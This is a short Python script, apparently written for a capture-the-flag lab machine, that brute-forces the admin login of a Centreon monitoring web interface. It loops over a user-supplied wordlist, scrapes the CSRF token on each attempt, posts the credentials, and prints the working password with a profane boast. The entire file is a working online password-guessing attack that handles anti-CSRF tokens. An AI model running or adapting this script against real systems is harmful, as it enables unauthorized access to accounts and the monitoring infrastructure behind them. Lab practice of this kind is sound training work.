#!/bin/python3
##
#########################
#########################

import requests
import sys
from bs4 import BeautifulSoup

wordlist = input("Enter full path of wordlist :")

#******* Auth Resquest ***************************

url = "http://10.10.10.157/centreon/index.php"
def sendcom(wordlist):
    with open(wordlist, "r") as g:
        for line in g:
            passw = line.rstrip('\n')
            s2 = requests.Session()
            response3 = s2.get(url)
            soup3 = BeautifulSoup(response3.text, features="lxml")
            token5 = {i['name']:i.get('value') for i in soup3.findAll('input')}            
            token6 = token5.get('centreon_token')
            #print(f"THIS IS THE TOKEN;{token6}")
            payload = {
                "useralias": "admin",
                "password": passw,
                "submitLogin": "Connect",
                "centreon_token": token6
            }
            response = s2.post(url, payload)
            if "Your credentials are incorrect" not in response.text:
                print(f"\n I FUCKING ROCKED THIS SHIT!!! : {passw}")
                break

sendcom(wordlist)

#######################
##
##
